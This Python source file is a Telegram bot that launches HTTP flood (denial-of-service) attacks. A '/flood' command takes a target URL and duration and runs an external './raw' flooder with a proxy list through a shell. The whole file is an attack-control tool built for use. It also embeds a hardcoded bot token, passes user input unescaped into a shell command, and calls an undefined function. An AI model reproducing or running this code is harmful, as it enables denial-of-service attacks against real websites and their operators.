import subprocess
import asyncio
import requests
import json
import socket
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse

logging.basicConfig(level=logging.INFO)

ALLOWED_CHAT_ID = -1002673143239
ALLOWED_USER_ID = [5622708943, 5942559129]
token_input = '7968600654:AAFeuRpTstSA465AVeEoH2FROQS8uSKkqNI'

is_attacking = False
ongoing_info = {}
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking

    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return

    if is_attacking:
        return

    try:
        url = context.args[0]
        time = int(context.args[1]) if len(context.args) > 1 else 120

        if time > 120 and update.effective_user.id not in ALLOWED_USER_ID:
            return

        ip = get_ip_from_url(url)
        if not ip:
            return

        is_attacking = True
        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}

        subprocess.Popen(
            f"screen -dmS tls bash -c 'chmod 777 * && ./raw {url} {time} 64 5 proxy.txt'",
            shell=True
        )

        for remaining in range(time, 0, -1):
            ongoing_info[update.effective_user.id]["time_left"] = remaining
            await asyncio.sleep(1)

        subprocess.call(["screen", "-S", "tls", "-X", "quit"])

    except:
        pass

    finally:
        is_attacking = False
        ongoing_info.pop(update.effective_user.id, None)

async def handle_flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.application.create_task(attack(update, context))

async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return
    # Không gửi phản hồi

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return
    # Không gửi phản hồi

def main():
    application = ApplicationBuilder().token(token_input).build()

    application.add_handler(CommandHandler("flood", handle_flood))
    application.add_handler(CommandHandler("ongoing", ongoing))
    application.add_handler(CommandHandler("help", help_command))

    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
